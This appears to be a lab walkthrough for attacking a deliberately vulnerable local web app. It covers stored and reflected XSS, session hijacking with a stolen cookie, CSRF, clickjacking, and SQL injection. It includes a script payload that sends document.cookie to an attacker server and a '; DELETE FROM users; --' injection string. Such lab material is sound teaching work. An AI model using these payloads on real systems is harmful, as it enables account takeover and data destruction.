=================
Stored XSS attack
=================

How to perform:

Start the attacker's webpage:

1. Go to the attacker directory
    cd attacker

2. Set up and start flask by running the following command:
    chmod +x./flask.sh

3. Set up and start flask by running the following command:
    ./flask.sh

4. Go to the review section of the webpage (http://localhost:80/)

5. Add some malicious javascript as a comment and click submit:
    <script>
        fetch("http://localhost:5000/attacker?cookie=" + document.cookie)
    </script>

====================
Reflected XSS attack
====================
1. Go to the login page, paste in the following and submit:
<script>alert("Reflected XSS");</script>

====================
Session hijacking
====================
In order for this to work a session token must be hijacked first. There is many ways this can be done. However, to keep things simple I have decided that it would be suitible to make use of the stored XSS attack to get a hold of a users session token for a user.

PRE-ATTACK STAGE:
1. Use chrome and seach for the "ModHeader" extention
2. Add the extention to chrome
3. Enable the extention to be used in icognito mode

ATTACK STAGE:
4. Open one chrome tab in regular mode
5. Go to http://localhost/singup.php in the regular mode tab
6. Make an account for the attacker
7. Log in as the attacker
8. Perform a stored XSS attack as outlined above 
9. Log out the attacker

10. Log in as a regular user @ http://localhost/login.php
11. Go to the reviews-section @ http://localhost/reviews.php

12. Make sure that the loged in user's session token has been hijacked by looking att the attackers phished_data.txt file. 
13. Use ModHeader to append a HTTP header cookie field. Add this header to each and every HTTP request:
Cookie = THE_HIJACKED_COOKIE_VALUE

EXAMPLE: 
Cookie = PHPSESSID=97507860b55c55846bf41675b7971e94

NOTE: The attacker will send his own session token to himself as a part of the stored XSS attack phase. Make sure you use the victim's session token session hijacking attack.

14. The attacker has now successfully hijacked a user's session and can perform any action that the authentic user can perform. The attacker can change the user's password, name or email adress. The attacker can even delete the user's account now.  


====================
CSRF
====================

1. Log in as a user at http://localhost/login.php
2. Go the the attacker's URL in another tab: http://localhost:5000/CSRF

==============
Clickjacking
==============
1. Go to http://localhost:5000/click-jacker

2. Click anywhere on the webpage

"You will start to download malware" after the click

==============
SQL Injection
==============

1. Go to the log in page and paste the following into the username-field:
'; DELETE FROM users; --

2. Click submit

3. Go to phpAdmin and check the users-table @ http://localhost:8001/

All the users have now been removed from the users table.


